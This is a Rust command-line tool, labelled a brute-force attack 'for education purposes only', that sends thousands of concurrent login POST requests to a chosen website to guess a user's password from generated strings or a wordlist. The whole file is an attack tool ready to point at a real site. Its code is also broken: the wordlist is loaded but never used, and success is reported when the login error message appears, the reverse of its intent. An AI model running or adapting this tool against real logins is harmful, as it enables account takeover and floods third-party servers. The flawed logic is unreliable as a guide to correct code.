use std::{fs::File, io::BufRead, io::BufReader};

use chrono::prelude::*;
use clap::{App, Arg};
use itertools::Itertools;

fn password_generator() -> impl Iterator<Item = String> {
    let charset: &str = "abcdefghijklmnopqrstuvwxyz0123456789";

    (1..=20)
        .flat_map(move |len| {
            charset
                .chars()
                .combinations_with_replacement(len)
                .map(move |combos| (combos, len))
        })
        .flat_map(|(combos, len)| combos.into_iter().permutations(len))
        .dedup()
        .map(|chars| chars.into_iter().collect())
}

async fn sending_requests(
    url: String,
    username: String,
    username_field: String,
    password_field: String,
    error_message: String,
    file_path: String,
) {
    let url = std::sync::Arc::new(url);
    let username = std::sync::Arc::new(username);
    let username_field = std::sync::Arc::new(username_field);
    let password_field = std::sync::Arc::new(password_field);
    let error_message = std::sync::Arc::new(error_message);
    let file_path = std::sync::Arc::new(file_path);

    let mut password_list: Box<dyn Iterator<Item = String>> = Box::new(password_generator());

    if file_path != std::sync::Arc::new("".to_string()) {
        let file: File = match File::open(&**file_path) {
            Ok(file) => file,
            Err(_) => {
                println!(
                    "[{}] File is not found",
                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string()
                );
                std::process::exit(1);
            }
        };
        let reader = BufReader::new(file);

        password_list = Box::new(reader.lines().map(|line| line.unwrap()));
    }

    let mut tasks = Vec::new();
    let mut request_amount = 0;
    let start_time = std::time::Instant::now();

    for password in password_generator() {
        request_amount += 1;

        let url = &url;
        let username = &username;
        let password = std::sync::Arc::new(password);
        let username_field = &username_field;
        let password_field = &password_field;
        let error_message = &error_message;

        tasks.push(async move {
            let fields = [(username_field, username), (password_field, &password)];

            loop {
                match reqwest::Client::new()
                    .post(&**url)
                    .form(&fields)
                    .send()
                    .await
                {
                    Ok(resp) => match resp.text().await {
                        Ok(text) => {
                            if text.contains(&**error_message) {
                                println!("{}", "-".repeat(50));

                                println!(
                                    "[{}] Correct Password: '{}'",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    password,
                                );

                                println!(
                                    "[{}] Request Amount: {}",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    request_amount.clone(),
                                );

                                println!(
                                    "[{}] Requests Per Second: {:.3}",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    request_amount as f64 / start_time.elapsed().as_secs_f64(),
                                );
                                std::process::exit(1);
                            }

                            break;
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                };
            }
        });

        if tasks.len() % 1000 == 0 {
            let tasks_length = tasks.len();

            println!(
                "[{}] Executing {} tasks",
                Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                &tasks_length
            );
            futures::future::join_all(tasks).await;

            tasks = Vec::new();
        }
    }
}

#[tokio::main]
async fn main() {
    let matches = App::new("Brute Force Attack")
        .author("Frolov Ivan <frolvanya@gmail.com>")
        .about("FOR EDUCATION PURPOSES ONLY")
        .arg(
            Arg::with_name("url")
                .short("u")
                .long("url")
                .value_name("URL")
                .help("Sets a website url")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username")
                .short("l")
                .long("login")
                .value_name("USERNAME")
                .help("Sets an username")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username_field")
                .long("username-field")
                .value_name("USERNAME_FIELD")
                .help("Sets an username field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("password_field")
                .long("password-field")
                .value_name("PASSWORD_FIELD")
                .help("Sets a password field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("error_message")
                .short("e")
                .long("err")
                .value_name("ERROR_MESSAGE")
                .help("Sets an authentication error message")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("file_path")
                .short("f")
                .long("file")
                .value_name("FILE")
                .required(false)
                .help("Sets a file path")
                .takes_value(true),
        )
        .get_matches();

    let website_url: &str = matches.value_of("url").unwrap();
    let username: &str = matches.value_of("username").unwrap();
    let username_field: &str = matches.value_of("username_field").unwrap();
    let password_field: &str = matches.value_of("password_field").unwrap();
    let error_message: &str = matches.value_of("error_message").unwrap();
    let file_path: &str = match matches.value_of("file_path") {
        Some(path) => path,
        None => "",
    };

    println!(
        "[{}] Starting Brute Force Attack",
        Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
    );

    sending_requests(
        website_url.to_string(),
        username.to_string(),
        username_field.to_string(),
        password_field.to_string(),
        error_message.to_string(),
        file_path.to_string(),
    )
    .await
}
